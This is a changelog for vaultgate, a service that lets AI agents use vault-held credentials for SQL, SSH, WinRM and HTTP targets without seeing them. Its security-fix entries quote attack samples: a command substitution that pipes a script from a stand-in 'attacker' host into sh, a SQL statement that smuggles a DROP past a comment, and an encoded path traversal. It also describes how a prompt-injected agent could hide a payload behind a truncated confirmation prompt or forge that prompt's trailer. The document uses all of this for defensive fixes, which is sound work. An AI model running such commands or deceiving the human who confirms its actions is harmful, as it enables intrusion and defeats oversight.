# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the project uses
[Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- ACT-4, ACT-5: **choose the vault item by searching, and its fields from a list.** After the
  kind, **Add computer** asks which vault item signs in: search by name, username or address, or
  paste an id. Each result shows the item's login name, first address and fields, a secret field
  as a sealed chip bearing only its name. The form then offers the item's own fields for every
  mapping (the login name, the password, a key, a custom field), never their values, and flags a
  default the item does not carry. **Choose another item** on the edit page runs the same search.
  The vault is read for these steps only inside the password window, and only its metadata.
- VAULT-19, ID-25: **Sync now** on the Vault page syncs the vault at once instead of waiting
  for the next scheduled sync, so a change made in Bitwarden reaches agents straight away. It is
  offered while the vault is ready, needs the usual form checks but no password confirmation,
  joins a sync already running rather than starting a second, and records
  `vault.sync_requested`. The log's `vault synced` line says `kind: manual` for it.
- ID-19, ACT-5: **an operator console with a sidebar.** Every page a signed-in operator sees now
  shares one frame: a sidebar with **Computers** (one entry per kind, with counts), **Agents**,
  **Activity** and **Vault**, an **Add computer** button, the vault's state and the operator; a
  top bar with the breadcrumb and how long editing stays unlocked; and the page. The account page
  is split into pages of their own: `/account/agents` (connected agents, and a matrix of which
  agent may use which computer), `/account/activity` (recent calls, unexpected writes, audit
  export), `/account/vault` (the connection) and Account & security at `/account`. The Computers
  page groups targets by kind (SQL Server, PostgreSQL, Windows · WinRM, Linux · SSH, HTTP APIs,
  Microsoft Graph) and shows the vault item and fields each signs in with, secret fields as a
  sealed chip bearing only the name. **Add computer** chooses the kind first and fills in its
  defaults; a computer has a page of its own and a separate edit page. `GET /account/unlock`
  confirms the password for the page you were on and brings you back (ID-15). Still no
  JavaScript and one stylesheet, now with a dark scheme and stacked tables at phone width; type
  uses the system's fonts, since the CSP loads none.

### Changed

- ID-23: `/` and a sign-in with no return path lead to the Computers page when the actions layer
  is on, and to Agents otherwise, rather than to `/account`.
- ACT-9: grants are managed from each computer's page and from the Agents page's matrix; an
  agent's card lists its computers as links rather than carrying its own grant forms.
- ID-26: a signed-in operator with no e-mail address yet is sent to set one from every console
  page, the Computers pages included.

- ACT-92: the planned `browser` sidecar is deployed on Azure as a separate Container App with
  internal-only ingress, not as a second container of vaultgate's app. The containers of one app
  share a network namespace, and `bw serve` listens unauthenticated on that loopback, so a
  Chromium compromised by a hostile page could have reached the whole vault. This is the same
  rule ADR 0008 set for the `code` sidecar. T39 now covers both sidecars. Specification only;
  the connector lands with M15.

## [0.1.0-rc.14] - 2026-09-24

### Fixed

- ID-18, ID-19: **browser sign-in and consent were refused with a bare `403 Forbidden`.** Every
  page was served with `Referrer-Policy: no-referrer` (Hono's `secureHeaders` default), and under
  that policy a browser sends `Origin: null` on a form POST, which the origin check compared with
  the public URL and refused. Reproduced in Chromium 153 against the reference deployment; the
  suite never saw it because its browser double always sends a real `Origin`. Pages now send
  `Referrer-Policy: same-origin`, so a same-origin POST carries its origin and nothing leaks
  cross-origin, and an `Origin: null` is treated as absent so the browser-set
  `Sec-Fetch-Site: same-origin` decides (a cross-site `null` is still refused).

## [0.1.0-rc.13] - 2026-09-24

### Added

- ADR 0008 and spec 14.8 specify a seventh actions connector, `code`, planned for M16. It lets
  an agent search and read a private GitHub repository through `code_search`, `code_find_related`
  and `code_read` under a new `actions:code` scope, without holding the repository token.
  vaultgate resolves the ref and streams that commit's archive to a new optional sidecar, which
  builds a `semble` index in its own container with no credential and, in Compose, no route out.
  Spec 13 and 13a gain the scope, the tools, the configuration, the error codes, migration `005`
  and the amended non-goals. The threat model gains the snapshot as an asset and T38 to T44.
  `PLAN.md` gains M16.

### Changed

- The documentation leads with what vaultgate is now for: letting hosted agents use the
  credentials in a Bitwarden vault without ever seeing them, so no secret reaches the model's
  context or the chat transcript. The README, spec 01 (purpose and design principles 1 to 3 and
  6), the comparison page (a row for using a credential without seeing it; the command-execution
  row and the "secret injection" caveat restated against ADR 0007), the FAQ, the security model,
  `llms.txt`, `PLAN.md` and the `server.json` and `package.json` descriptions now describe the
  actions layer as the primary path and the vault tools as the audited fallback. Principle 6 now
  names the optional `browser` sidecar (ACT-91) that it previously ruled out. No behaviour
  changes.
- MCP-16: the instructions an agent receives when it connects now depend on its token. A token
  that holds an `actions:*` scope, on a deployment with the actions layer enabled, is told to
  list its targets and act through them, and to prefer an action to `get_secret` so that a
  credential it only needs to use never enters the conversation. Every other token gets the
  previous text unchanged.

## [0.1.0-rc.12] - 2026-09-24

### Added

- **`winrm` targets speak NTLMv2 over `Negotiate`, and it is now the default** (spec 14 §14.6,
  ACT-89). A stock Windows 10 or 11 machine runs one listener — HTTP on 5985, no certificate —
  with `Basic` disabled and `AllowUnencrypted` set to `false`, and answers `POST /wsman` with
  `401 WWW-Authenticate: Negotiate`. vaultgate now speaks exactly that, so **no change to the
  Windows host is required**: the password never crosses the network (NTLM answers a
  server-chosen challenge), and every SOAP message is sealed and signed with a session key
  derived from the exchange and wrapped in the MS-WSMV `multipart/encrypted` form, which is what
  `AllowUnencrypted=false` demands. Over `https://` the transport already encrypts and the
  envelope is sent as it is, with the ACT-57 certificate pin unchanged. NTLM authenticates the
  connection, so one socket carries the handshake and all six exchanges of a call.
- `destination.auth` on a `winrm` target: `negotiate` (new, the default) or `basic`, which is
  kept for a listener whose owner has deliberately enabled it. `basic` on an `http://` URL is
  refused at save — it is the one combination that really does send the password in the clear,
  and `negotiate` exists for that endpoint. The account may be a bare local name, `DOMAIN\name`
  or a user principal name.
- `src/crypto/md4.ts` and `src/crypto/rc4.ts`. **Both are broken primitives, and neither protects
  anything on its own; they are here because NTLM is defined in terms of them** — the NT hash is
  `MD4(UTF-16LE(password))` and `SEAL` is RC4 — **and OpenSSL 3 removed both from its default
  provider, so `node:crypto` cannot supply them.** What the exchange rests on is the
  challenge-response construction and the per-connection session key. vaultgate hashes nothing of
  its own with MD4 and encrypts nothing of its own with RC4; stored secrets still use
  AES-256-GCM. Each file says so at the top, ACT-89 records the reasoning, and each is proved
  against its own specification's vectors (RFC 1320; the published RC4 vectors) rather than
  against another implementation. The NTLMv2 responses, the four derived sub-keys and the message
  signature are proved against the worked example in MS-NLMP 4.2.4.
- Every byte of a challenge and of a `multipart/encrypted` reply is read as strictly as the XML
  reader reads a SOAP response (T33): bounds-checked offsets and lengths, a capped attribute
  list, the sealed payload located from the declared length rather than by hunting for a boundary
  inside bytes the destination chose, and anything malformed refused as `upstream_error` rather
  than worked around. A signature that does not verify fails the call; an answer sent in the
  clear where the exchange requires encryption is refused rather than read.
- `KeptConnection` in `src/net/`: one socket held across the requests of an authenticated
  session, released when the session ends. It now also remembers the leaf certificate its peer
  presented, which is the only place a later layer can read one.
- **`winrm` targets on an `https://` endpoint bind their NTLM exchange to the TLS connection**
  (spec 14 §14.6, ACT-89, threat T35). Nothing in an NTLM exchange names the channel it travels,
  so an attacker able to terminate TLS in front of the destination could relay the handshake and
  sign in as the operator's account elsewhere. The authenticate message now carries the RFC 5929
  `tls-server-end-point` channel binding in `MsvAvChannelBindings`: the leaf certificate the
  socket's peer actually presented, digested with SHA-384 or SHA-512 where the certificate is
  signed with one and SHA-256 otherwise, marshalled into the `gss_channel_bindings_struct` and
  MD5'd as MS-NLMP requires. Windows verifies it at its default `CbtHardeningLevel` of `Relaxed`,
  so there is **nothing to configure on the host**. A plain `http://` endpoint has no channel to
  bind to and sends no such attribute, which is correct — there the mitigation is that such a
  destination must be `internal: true` (ACT-56).
- The threat model covers the NTLM path: relay (T35), offline cracking of a captured exchange
  (T36) and the protocol-mandated weak primitives (T37), plus an on-path attacker to a
  destination, the MIC's dependence on the server's `MsvAvTimestamp`, and the accepted residual
  that NTLM is weaker than Kerberos. The actions guide now says plainly that a `winrm` account
  should be dedicated, low-privilege and given a long random password, for the same reason the
  `ssh` guidance insists on a restricted key.

### Fixed

- **The ACT-57 certificate pin did not take effect on the wire.** It was expressed as
  `agent: false` plus a `createConnection` in the request options, and Node ignores
  `options.createConnection` once a request has an agent — which `agent: false` gives it, a
  default agent whose sockets the system trust store verifies. A pinned destination presenting a
  self-signed certificate therefore failed with `DEPTH_ZERO_SELF_SIGNED_CERT` instead of being
  accepted by its pin, and one presenting a different CA-signed certificate would have been
  accepted by the store. The pin is now an agent of vaultgate's own whose `createConnection` is
  the corked, pin-checked socket, so the guard runs where it was always meant to. The existing
  test asserted the option shape rather than the mechanism Node uses, and was rewritten around
  the agent.

### Changed

- The `winrm` section of the actions guide is rewritten around `Negotiate`, since that is the
  path an operator will use; the `Basic` setup is kept as a short note for the case where someone
  wants it.
- The `winrm_run` tool description no longer says "over HTTPS", because it is no longer only
  HTTPS.
- **The actions guide now recommends an `https://` endpoint with the certificate pinned, and
  documents the plain listener as the fallback.** The previous ordering led with `negotiate` over
  `http://` because that is what reaches a stock host unmodified, which is right about
  reachability and wrong as security guidance: TLS covers the whole transport and authenticates
  the endpoint, where NTLM over 5985 seals the SOAP body and leaves the metadata in the clear.
  The usual objection — that the certificate will be self-signed, which makes the encryption
  theatre — is answered by `certificate_sha256`, and the guide now makes that argument rather
  than listing the options: the pin replaces the system store, is compared before anything is
  sent, and has no ignore-errors counterpart anywhere in the schema. The plain path keeps its
  section, including the measurement against an unmodified Windows 11 Pro machine that is the
  reason it exists, and what it does and does not protect is now stated explicitly.
- ACT-89 and the post-1.0 candidates in `PLAN.md` record Microsoft's phased removal of NTLM
  (deprecated June 2024; auditing today; IAKerb and a Local KDC in the second half of 2026;
  network NTLM blocked by default, which policy can still re-enable, in the next major Windows
  Server release) and name **Kerberos as the successor for `winrm`**, with IAKerb and the Local KDC as
  the trigger rather than a date. Nothing in the connector stops working: NTLM remains available
  by policy, and the blocking phase is a future server release.
- T37 and the header of `src/actions/connectors/winrm/ntlm/ntlmv2.ts` now cite RFC 6151 §2.3 for
  the HMAC-MD5 position — the attacks "do not seem to indicate a practical vulnerability when
  used as a message authentication code", and "it may not be urgent to remove HMAC-MD5 from the
  existing protocols", though a new design should not include it — because implementing an
  existing protocol is a stronger position than "the protocol made me". T37 also records why the
  CodeQL alerts are dismissed one at a time in public rather than filtered: a filter selects on
  query metadata rather than paths, so it would blind the whole repository to the rule, including
  a future misuse of MD5 somewhere it would matter.
- The guide warns that a remote PowerShell shell serialises its progress records as CLIXML on
  `stderr` while exiting 0 — `Get-ComputerInfo` emits several kilobytes of it — recommends
  `$ProgressPreference = 'SilentlyContinue'` where the target's policy allows the statement, and
  restates that `exit_code` is how a failure is told.

## [0.1.0-rc.11] - 2026-09-24

### Fixed

- VAULT-7: stopping vaultgate no longer logs a warning. The supervisor locks the vault on the way
  down, and by then the `bw serve` child is usually already gone, so the lock could not connect and
  was reported as `vault lock failed` at warning level on every upgrade — eleven times in the
  reference deployment's journal. A backend that has stopped cannot be locked and does not need to
  be, because its session went with the process, so that outcome is now recorded at information
  level as what it is. A vault that is reachable and refuses to lock is still a warning, because
  then something really did stay unlocked.

## [0.1.0-rc.10] - 2026-09-24

### Added

- A confirmation-message rendering test per connector (spec 13 §13.8, M14; ACT-43): the exact
  ACT-42 message for an `http` POST, a `sql_execute` statement, an `ssh_run` command and a
  `winrm_run` command, each asserted whole and asserted to contain no policy pattern (every
  target in the test carries one no call matches), no vault item id and no injected value. The
  vault is made to refuse everything first, so a message that survives proves the credential was
  never fetched (ACT-41). A statement longer than 1 KiB is cut at the first KiB, and `sql_query`
  — a read whatever the policy says — is never confirmed at all.
- `connectLegacySdkClient` in the test support: the real MCP client SDK on the 2025 wire, used by
  the ACT-76 cases below.

### Changed

- The changelog keeps the recent releases; 0.1.0-rc.1 to 0.1.0-rc.5 moved verbatim to
  `docs/changelog-archive.md`. The file had reached five bytes below the repository's 64 KiB
  file-size gate, so the next entry of any size would have failed the gate for whoever wrote it.
- **Spec ACT-48 is rewritten: there is no in-band elicitation fallback for the older protocol
  wire, and there cannot be one in this deployment model.** The clause previously required the
  engine to fall back to the SDK's server-to-client `elicitation/create` request when the
  negotiated revision predates the multi-round-trip pattern but the client declared `elicitation`
  at initialisation. Implementing it proved impossible under MCP-1's stateless handler, which
  builds a fresh server per HTTP request and so never sees `initialize` — the one place the older
  wire has to declare that capability. The SDK documents the same boundary on its per-request
  capability view ("per-request instances that never saw an initialize (stateless legacy) hold
  nothing, so gates refuse there"), and its legacy shim, asked to fulfil the request anyway,
  answers "no client capabilities are available on this connection — per-request legacy serving
  cannot receive server-to-client requests". Attempting the fallback is strictly worse than
  refusing: measured against a real SDK client on `2025-11-25`, it returns an untyped `isError`
  text result in place of the `confirmation_unavailable` code an agent can act on, writes no
  `action_calls` row at all, and still shows no human a prompt. The `confirmation_unavailable`
  refusal therefore stands, ACT-48 and ACT-76 now say why, `docs/PLAN.md`'s M14 entry is
  corrected, and the operator guides tell an operator what to do instead (a client on
  `2026-07-28`, or `confirm_writes: false` with the ACT-63 review). Two tests drive a real SDK
  client on the older wire and pin what it actually gets: the refusal, no prompt shown though the
  client offered to render one, the ACT-60 row written — and a read on the same target and the
  same wire still served, so the limit is the confirmation and nothing else.
- `docs/spec/12-compatibility.md` gains §12.2.1, a form-mode elicitation row per client. Only
  `@modelcontextprotocol/client` is marked supported, evidenced by the in-process suite that runs
  in CI; every product client is "not yet verified" rather than guessed, and the section says a
  row is filled in only from a run someone performed and recorded.

- Policy-form validation messages, the call-history and unexpected-write views, and grant
  management from the connected-clients list (spec 13 §13.3.2 and §13.12, M14; ACT-5, ACT-6,
  ACT-7, ACT-49, ACT-63). A target's page gains **The whole call history**, which pages back
  through its `action_calls` rows 50 at a time, newest first, on a keyset cursor so a page never
  shifts while rows are appended or retired. The Actions section gains **Unexpected writes**
  (`/account/actions/unexpected`): every call across every target that was not a read and whose
  elicitation did not end in an accepted confirmation, with the target, the client, the tool, the
  classification, the outcome and an excerpt of the stored — already scrubbed — arguments, so a
  target with `confirm_writes: false` is reviewable and a declined, cancelled, expired or refused
  confirmation on any other target is visible. Rows left behind by a deleted target keep its name
  without a link (ACT-8). A rejected save now shows each problem against the control it names,
  with an operator-facing sentence per policy field of every connector and the check's own detail
  in brackets; a problem that names no control — the destination as a whole, the vault item's
  fields — is still listed under the banner, so nothing is hidden. The account page's
  connected-clients list gains a **Targets** column with a Remove form per grant and a picker for
  the rest, injected by the composition layer so `src/oauth/` still knows nothing of the actions
  layer (ACT-70); it writes through the same service, the same ID-15 gate and the same ACT-7
  audit events as the target's own page. `confirm_writes` was already on by default in the form;
  a target that allows a non-read operation and has it turned off now carries a standing note
  saying what that means, which needed each connector to answer whether its policy allows
  anything but a read.
- `npm run check:requirements` (`scripts/check-requirement-citations.mjs`), part of
  `npm run quality`: every `ACT-n` the specification defines must be named by at least one test
  title. The `browser` requirements of M15 (ACT-29…33, ACT-91…102) are allowlisted inside the
  script with their reason; every other actions requirement is cited, and the gate fails if one
  loses its citation or if an allowlisted identifier leaves the specification.

- `winrm` connector runtime and `winrm_run` (spec 14 §14.6 and spec 13 §13.6.5, M13; ACT-27,
  ACT-28, ACT-89, ACT-90): the tool is listed on a deployment with `VAULTGATE_ENABLE_ACTIONS=true`
  and `VAULTGATE_ACTIONS_ENABLE_WINRM=true` for tokens holding `actions:winrm`. A `winrm` target
  names the WS-Management endpoint (`https://host:5986/wsman`; a plain `http://` one only on an
  `internal` target, which the save-time check insists on), the login name the command runs as,
  the shell (`powershell` by default, or `cmd`) and optionally the SHA-256 of the listener's leaf
  certificate. That pin replaces the system certificate store rather than adding to it, which is
  what a listener with its own certificate needs: the socket is held corked until the certificate
  presented matches, so nothing — least of all the credential — is sent to a host that fails the
  check, and a mismatch is `tls_error`. The credential is a password from the vault item, sent as
  `Basic` over TLS. The policy names either a list of command patterns or `any_command`, exactly
  as `ssh`. The WS-Management client is written here rather than taken from npm — the M13 spike
  compared the published clients against it and is recorded under M13 in `docs/PLAN.md` — so the
  connector adds no dependency: six SOAP exchanges (`Create` the shell, `Command`, `Send` for
  standard input, `Receive` polled until the command state is `Done`, `Signal terminate`,
  `Delete`) over the pinned transport, and a reader written for exactly the elements those
  responses carry, which refuses a DOCTYPE, an entity of any kind, a comment, a CDATA section, an
  over-deep or over-wide document and a stream that is not base64. A PowerShell command is sent as
  an `-EncodedCommand` with `WINRS_SKIP_CMD_SHELL`, so nothing re-parses the quoting the agent
  wrote; a `cmd` command is the command line `cmd.exe` parses. The policy timeout signals
  `terminate` and then deletes the shell, both on a short deadline of their own. Contract tests
  drive the connector against a fake WS-Management destination that scripts all six operations,
  asserts the exact `Command`, `Send` and `Signal` envelopes, polls slowly, faults, answers 401
  and a body that cannot be read, and echoes the password back for the canary suite. A JavaScript
  fault escaping the connector is `connector_fault`, never `upstream_error`. Operator
  guide: `docs/guides/actions.md` ("Creating a `winrm` target", "Calling a `winrm` target"); tool
  reference: `docs/guides/tools-and-scopes.md`.
- The account page can create and edit `winrm` targets, with the same standing warning on a
  target that allows any command (ACT-88).
- The pinned HTTPS transport can pin a destination to its leaf certificate
  (`src/net/certificate-pin.ts`, ACT-57). Only a caller that supplies a certificate check gets the
  behaviour; the CIMD fetcher and the `http` connector are unchanged and keep verifying against
  the system store.
- ACT-57, T33: the certificate guard treats a peer that presented no certificate as a failed
  pin rather than asking for the digest of nothing, which would have thrown inside the socket's
  own event listener, an uncaught exception rather than a failed call. The socket was already
  left corked, so no credential could have reached such a peer either way.

### Fixed

- **ACT-35, ACT-39, ACT-88: a wildcard in a command allowlist was an unrestricted shell.** `*`
  matches any run of characters, and `;`, `&&`, `|`, a backtick and `$( )` are characters, so a
  pattern could not restrain them: measured against the operator guide's own recommended
  patterns, `journalctl -u nginx --since *` admitted
  `journalctl -u nginx --since $(curl -s http://attacker/p | sh)`, and bounding the wildcard on
  both sides — the shape the guide presented as the safe idiom — did not help, because command
  substitution sits inside the run the `*` matches. Every `allowed_commands` target holding a
  wildcard was therefore an `any_command` target in practice, but without the deployment switch,
  the standing operator warning, `unrestricted: true` in `actions_list_targets` or the full
  command in `classification` — the whole of T24's command-allowlist mitigation, bypassed by
  punctuation. A command on a target that is not an any-command one may now contain no shell
  metacharacter (`;`, `&`, `|`, a backtick, `$`, `<`, `>`, `(`, `)`), exactly as it may contain
  no line break, and is refused with the new `policy_denied` reason `command_metacharacter`
  before anything connects. A pattern that holds one is refused at save, because no command that
  matched it could ever be allowed. The refusal is a runtime rule rather than a save-time
  warning because a warning would have had to fire on every wildcard, which is most of them: a
  wildcard is a legitimate way to fill in an argument, and it is now only that. The guide says
  what a `*` can and cannot do, including the residue a wildcard genuinely leaves — the rest of
  the allowed program's own command line, which needs no metacharacter — and the specification
  says what the code does.
- **ACT-42, ACT-43: the human confirmation prompt was silently truncated, and its trailer could
  be forged.** The prompt is what T24 relies on to stop a prompt-injected agent in front of an
  honest human, and a person who ticks a box for text whose dangerous clause was cut has been
  given the appearance of consent rather than the substance: a 1210-character command showed
  1024 characters with the tail invisible and nothing saying so. The summary is now the first
  768 characters and the last 192 — the tail is where an appended payload hides — and the
  message carries a line of vaultgate's own saying how many characters are missing and the
  SHA-256 of the whole operation. vaultgate does not refuse to confirm a long operation: refusing
  would push an operator towards `confirm_writes: false`, which is the weaker of the two states
  the clause exists to protect. Every line of the summary is now quoted with `>` and the message
  says so, so an agent can no longer reproduce the prompt's own trailer between the `\n\n`
  delimiters and make the message appear to end early — anything it wrote is a quoted line, and
  the trailer is the only unquoted one. On the audit side, an `arguments` value cut at the 4 KiB
  cap now says so in the stored text and carries the SHA-256 of the whole: `ssh` and `winrm` have
  ACT-88's full command in `classification`, but a 64 KiB `sql` statement had no fallback at all
  and hid its operative clause from the ACT-63 unexpected-write view.
- **ID-18: a synchroniser token of the same code-unit length but a different byte length crashed
  the route.** `timingSafeEqual` raises a `RangeError` on buffers of different lengths, so the
  comparison threw and the route answered `500` with no audit event, where ID-18 requires `403`
  with one — a silent gap in the trail is exactly what an operator needs to see. The comparison
  is over byte lengths now.
- **ID-24: a notice query parameter naming an inherited property crashed the page.** `/account`
  and `/account/actions/:id` indexed a plain object with the parameter, so `?notice=constructor`
  returned a function to the renderer and answered `500`. The lookup is an own-property one.
- **ID-19: the Actions pages inherited their CSP and `no-store` from identity's mount order.** The
  headers arrived only because `identity.routes` is mounted before the actions pages in
  `http/app.ts`. The pages now set them through the middleware identity hands the composition
  layer, and a test asserts both on every Actions page.
- **ACT-53: a driver message reached the log unscrubbed on one path in `sql` and `winrm`.** pino's
  OPS-1 redaction works by field name, so the free-text reason logged when a session would not
  close or a shell would not delete was the one place upstream text left those connectors without
  passing the call's scrub table. `RunSupport` gains `scrub`, which both now use. The `winrm`
  half also logged only the fixed §13.16 sentence rather than the service's own words, so it said
  nothing an operator could act on; it now reports the fault's reason, scrubbed.
- Performance, not a defect: `engine-run` scrubbed every captured stream twice, once in the
  capture pass and again in the deep pass over the merged result — about 166 ms per MiB with a
  four-secret table, on the event loop that also serves OAuth and the operator pages. Only the
  connector's own result fields go through the deep pass now, and the scrubber skips a position
  no variant can begin at, which is nearly all of them.
- **ACT-51, ACT-52, ACT-53: a body that was not text defeated the scrubber.** The `http`
  connector base64-encoded the body itself; base64 is positional, so no ACT-51 variant matched
  and the credential came back verbatim under `body_encoding`, at any offset. Connectors no
  longer encode: `Scrubber` gains `bytes` and `base64`, `ConnectorOutput` a `base64` list, and
  the engine scrubs raw bytes before it encodes and cuts. `sql`'s binary columns are closed the
  same way and `Scrubber.buffer` scrubs bytes too. Every connector with a body has a non-textual
  canary test, against an `http` fake that can now answer arbitrary bytes under a chosen type.
- **ACT-36: a bare carriage return smuggled a second statement past the SQL classifier.** A `--`
  comment ends at a bare CR on both engines but ran to `\n` here, so `SELECT 1 --x\r; DROP t`
  classified `read`. It now ends at either terminator, and ACT-34's command `*` stops at CR too,
  so an allowlist pattern cannot span a line the server splits. A `statement` may
  no longer carry a NUL or other C0 control character but tab, CR and LF, as ACT-27 requires of a
  `command` (ACT-23), and `DBCC`, `WRITETEXT`, `UPDATETEXT` and `READTEXT` join ACT-37's deny
  set, an omission corrected in both places.
- **ACT-51: the `winrm` `Basic` pair was never scrubbed.** Its login name is in the
  destination, so the engine built the scrub table without one and never made the
  `base64(username:password)` variant it sends; a listener echoing that header back in a fault
  leaked the pair. `ConnectorSchemas` gains `basicUsername`.
- **ACT-20, ACT-35: `%2F` in a path walked past `allowed_paths`.** Normalisation decodes
  unreserved characters only, so `/orders/..%2F..%2Fadmin%2Fusers` matched `/orders/*` and
  reached the wire unchanged. Both are now refused in the path, not the query.
- ACT-88: a target submission naming a deployment-gated policy field is now refused and told why,
  instead of being dropped in silence. The account page does not draw the any-command field where
  `VAULTGATE_ACTIONS_ALLOW_ANY_COMMAND` is off, so an ordinary browser never sends one; a
  hand-made request that did was saved as an ordinary restricted target, and the same request with
  an empty command allowlist was answered "give at least one command pattern, or set any_command",
  advising the operator to do the very thing the deployment forbids. The switch could never be
  defeated, so this was an honesty defect rather than a security one, but the service's own
  refusal was unreachable on the only path that writes a target. Found by the M12 live test.

## [0.1.0-rc.9] - 2026-09-24

### Added

- `ssh` connector runtime and `ssh_run` (spec 14 §14.5 and spec 13 §13.6.5, M12; ACT-27, ACT-28,
  ACT-87, ACT-88): the tool is listed on a deployment with `VAULTGATE_ENABLE_ACTIONS=true` and
  `VAULTGATE_ACTIONS_ENABLE_SSH=true` for tokens holding `actions:ssh`. An `ssh` target names a
  host, a port, the login name the command runs as and the server's host key — the line
  `ssh-keyscan` prints, or its `SHA256:` fingerprint — which is parsed at save, so a target that
  could never be verified cannot be stored; there is no trust-on-first-use and no way to skip the
  check. The credential is either a private key from the vault item (with an optional passphrase
  field) or a password. The policy names either a list of command patterns or `any_command`,
  never both and never neither. A call matches the whole command against the patterns before
  anything connects (`policy_denied`, reason `command`; a command beyond 16 KiB is
  `command_size`), refuses a newline or carriage return except on an any-command target, and
  refuses a NUL byte as `invalid_arguments`. The connection goes to the address the engine
  resolved and validated once, with the host name kept for the host-key lookup; the presented key
  is checked in `ssh2`'s `hostVerifier` during the key exchange, so a mismatch fails
  `host_key_mismatch` before any credential is offered. `ssh-rsa` (the SHA-1 signature algorithm)
  is removed from the host-key algorithms and only the one authentication method the mapping
  names is offered, so no agent, `none` or keyboard-interactive attempt can follow. One exec
  channel runs the command with no pseudo-terminal, no agent forwarding, no X11, no environment
  and no port forwarding; standard input is written and closed; standard output and standard
  error are captured separately, each cut at the target's output limit with the scrubber's guard
  band; and the connection is closed when the call ends. The policy timeout signals `KILL` to the
  remote command. Every call is a shell operation, so `confirm_writes` asks a human first, and
  every injected value in every encoding is replaced by `[redacted:<field>]` in the result, the
  error detail and the audit row. Contract tests drive the connector over a fake client (every
  policy reason, both authentication modes, the caps with a value straddling the cut, the
  timeout, the canary suite) and the real `ssh2` wrapper over a fake driver, so no test needs a
  server. Operator guide: `docs/guides/actions.md` ("Creating an `ssh` target", "Calling an `ssh`
  target"); tool reference: `docs/guides/tools-and-scopes.md`.
- The account page can create and edit `ssh` targets, and shows a standing warning on a target
  that allows any command (ACT-88). The unrestricted box is drawn only on a deployment with
  `VAULTGATE_ACTIONS_ALLOW_ANY_COMMAND=true`, and turning that switch off afterwards refuses
  every call on such a target and hides it from `actions_list_targets`, as §13.14 says it should.
- Runtime dependency `ssh2` (exact pin, ACT-72, ACT-87, QG-9). `package.json` gains an
  `allowScripts` block denying the install scripts of `ssh2` and of its optional `cpu-features`
  binding, so `npm ci` compiles nothing on any platform and no native addon reaches
  `node_modules`; the library uses its JavaScript implementations, which is all it needs.

### Changed

- `ssh` and `winrm` share one command policy (`src/actions/connectors/command.ts`): the ACT-27
  argument shape, the ACT-88 allowlist-or-`any_command` rule, the ACT-39 decision, the ACT-43
  summary and the ACT-19 capabilities are now written once, so the two connectors cannot drift
  apart. Behaviour is unchanged except as below.
- `ssh_run` and `winrm_run` refuse a command containing a C0 control character other than tab,
  carriage return or line feed (`invalid_arguments`), not only a NUL byte. XML 1.0 cannot carry
  one even as a character reference, so a `winrm` command holding one could never be sent; on
  `ssh` it is a mistake or a terminal escape. ACT-27 is updated to say so.
- The audited `classification` of a call is now scrubbed like its arguments, because an
  any-command `ssh` target records the whole command there (ACT-60, ACT-61, ACT-88): the 4 KiB
  cap on `arguments` could otherwise cut the very command an operator needs to read back.
- A connector's loader receives the actions configuration, so the `ssh` runtime can close over
  `VAULTGATE_ACTIONS_ALLOW_ANY_COMMAND` and refuse every call on an any-command target once the
  deployment withdraws it.
- The guide now says that vaultgate's `tls: "require"` is not PostgreSQL's `sslmode=require`: it
  verifies fully against the system trust store, closer to `verify-full`. It also corrects the
  least-privilege example, which implied that `DENY EXECUTE` in the target database stops
  `EXEC sp_who`; it does not, because that procedure lives in `master` where `public` may execute
  it. The classifier is what refuses it, before any connection exists.

### Fixed

- `sql` connector, three defects an M11 live test found in `v0.1.0-rc.8` against a real
  PostgreSQL 18 and a real SQL Server 2019 (ACT-24, ACT-55, ACT-57, ACT-74, ACT-84).
  - **SQL Server never worked at all.** `mssql` is CommonJS and `cjs-module-lexer` finds none of
    its classes, so the ESM namespace Node offers is `default`, `module.exports` and
    `valueHandler`: `const { ConnectionPool } = await import('mssql')` was `undefined` and every
    call failed with `ConnectionPool is not a constructor`. Both drivers now come through one
    checked lookup that takes the class off `default` when the namespace does not carry it, and
    refuses by name if neither does. The suite injected fakes everywhere, so the one line that
    touched the real package was never executed; the new tests import the real `mssql` and `pg`
    and drive the production interop over the namespace Node really offers, opening no
    connection, and fail if either package changes its export shape.
  - **A `TypeError` inside the connector no longer blames the destination.** A JavaScript fault
    is the new `connector_fault` (§13.16), whose message says the call failed inside vaultgate
    and that the destination may never have been contacted, rather than `upstream_error`'s "the
    destination reported an error".
  - **A TLS target whose host is an IP literal.** No server name is sent for an address — SNI has
    no syntax for one and Node refuses it — and the certificate is verified against its IP
    subject-alternative names instead, which is the correct verification for an address.
    PostgreSQL targets reached by address now connect. SQL Server cannot verify an address at all
    (Tedious puts the server name straight into the handshake and its in-band TLS path leaves
    nothing else to verify against), so such a target is now a save-time problem naming the two
    ways out instead of an `ESOCKET` at call time. Pinning is unchanged: the socket still goes
    only to the address the engine validated.
  - **SQL Server decimals kept their scale.** A decimal string now carries the scale its column
    declares, so `decimal(10,2)` 3.50 is `"3.50"` and not `"3.5"`. Tedious builds the double
    inside its own value parser, before `mssql`'s `valueHandler` registry can see it, so a value
    whose unscaled integer passes `Number.MAX_SAFE_INTEGER` has already lost digits: rather than
    return a plausible wrong number — which is what ACT-24 exists to prevent — the call fails with
    `connector_fault` and `detail.reason: "exact_numeric_precision"`, and the guide says to cast
    the column to `varchar`.

## [0.1.0-rc.8] - 2026-09-24

### Added

- `sql` connector runtime and `sql_query` (spec 14 §14.4 and spec 13 §13.6.4, M11 first pull
  request; ACT-23, ACT-24, ACT-26, ACT-36, ACT-37, ACT-38, ACT-77, ACT-84, ACT-85, ACT-86): the
  tool is listed on a deployment with `VAULTGATE_ENABLE_ACTIONS=true` and
  `VAULTGATE_ACTIONS_ENABLE_SQL=true` for tokens holding `actions:sql.read`. A `sql_query` names
  a granted target and gives exactly one statement (at most 64 KiB) and up to 100 positional
  parameters. The statement is tokenised in the target's own dialect — `'…'` with doubled
  quotes, `N'…'` on SQL Server, `E'…'` and `$tag$…$tag$` on PostgreSQL, `"…"` and `[…]` quoted
  identifiers, line comments and block comments that nest on PostgreSQL — and refused before any
  connection is opened when it is more than one statement (`policy_denied`,
  `statement_count`) or does not classify as a read (`policy_denied`, `statement_class`); the
  class it was given is recorded on the refused call as well as on the call that ran. Parameters
  bind to `$1…$n` (PostgreSQL) or `@p1…@pn` (SQL Server), counted in the tokenised statement, and
  any mismatch is `invalid_arguments`; there is no interpolation path. One connection is opened
  per call after the policy decision, to the address the engine resolved and validated once, with
